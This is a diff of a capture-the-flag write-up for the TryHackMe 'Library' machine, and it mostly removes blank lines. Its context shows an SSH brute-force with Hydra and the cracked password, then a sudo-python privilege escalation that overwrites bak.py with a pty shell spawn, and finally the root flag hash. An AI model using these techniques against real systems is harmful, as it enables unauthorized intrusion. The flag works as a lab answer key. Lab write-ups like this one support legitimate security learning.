@@ -4,7 +4,6 @@ boot2root machine for FIT and bsides guatemala CTF
 
 ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/484c37bcb5b90fac35d15f0c5ccdaed6.jpeg)
 
-
  Library
 
  Start Machine
@@ -138,8 +137,6 @@ view-source:http://10.10.253.155/robots.txt
 
 User-agent: rockyou 
 Disallow: / 
-
-
 
 Posted on June 29th 2009 by meliodas - 3 comments
 
@@ -400,7 +397,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-26 13:20:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-26 13:20:46
 
-
 meliodas : iloveyou1
 
 ┌──(kali㉿kali)-[~]
@@ -448,7 +444,6 @@ Matching Defaults entries for meliodas on ubuntu:
 User meliodas may run the following commands on ubuntu:
     (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
 
-
 meliodas@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
 -rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
 -rwsr-xr-x 1 root root        40K May 15  2019 /bin/mount
@@ -466,7 +461,6 @@ meliodas@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
 -rwsr-xr-- 1 root messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 -rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
 -rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-
 
 Este código es un script de Python que se utiliza para crear un archivo ZIP que contiene el contenido de un directorio especificado. El script comienza importando dos módulos de Python: "os" y "zipfile". Luego define una función "zipdir" que recibe dos argumentos: "path", que es la ruta del directorio que se va a comprimir, y "ziph", que es un objeto "ZipFile" que se utilizará para escribir el archivo ZIP.
 
@@ -498,17 +492,12 @@ import pty;pty.spawn("/bin/bash")
 
 or
 
-
 meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
 meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
 root@ubuntu:~# cat /root/root.txt
 e8c8c6c256c35515d1d344ee0488c617
 
-
 ```
-
-![[Pasted image 20221226131618.png]]
-
 
 user.txt  
 
@@ -517,6 +506,5 @@ user.txt
 root.txt
 
 *e8c8c6c256c35515d1d344ee0488c617*
-
 
 [[ColddBox Easy]]
